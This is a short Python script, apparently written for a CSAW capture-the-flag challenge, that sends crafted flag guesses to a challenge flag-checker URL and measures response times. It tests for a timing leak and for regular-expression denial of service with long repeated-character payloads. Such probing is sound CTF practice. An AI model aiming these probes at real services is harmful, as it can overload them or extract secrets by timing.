import urllib.request, urllib.error, time, statistics
B="http://flagchecker.chal.csaw.io:5000/check"
def post(body):
    req=urllib.request.Request(B, data=body.encode(), headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64)","Content-Type":"application/x-www-form-urlencoded"})
    t0=time.perf_counter()
    try:
        r=urllib.request.urlopen(req, timeout=15); r.read()
    except urllib.error.HTTPError as e:
        e.read()
    return (time.perf_counter()-t0)*1000

def med(body, n=5):
    ts=[post(body) for _ in range(n)]
    return round(statistics.median(ts),2), round(min(ts),2), round(max(ts),2)

print("baseline csaw{test}:", med("flag=csaw{test}"))
print("A*100:", med("flag="+"A"*100))
print("A*1000:", med("flag="+"A"*1000))
print("A*5000:", med("flag="+"A"*5000))
print("a*1000:", med("flag="+"a"*1000))
print("b*1000:", med("flag="+"b"*1000))
print("ReDoS classic (a*30b*30c*30):", med("flag="+"a"*30+"b"*30+"c"*30))
print("ReDoS classic x10:", med("flag="+"a"*300+"b"*300+"c"*300))
print("csaw{ + a*1000 + }:", med("flag=csaw{"+"a"*1000+"}"))
EOF
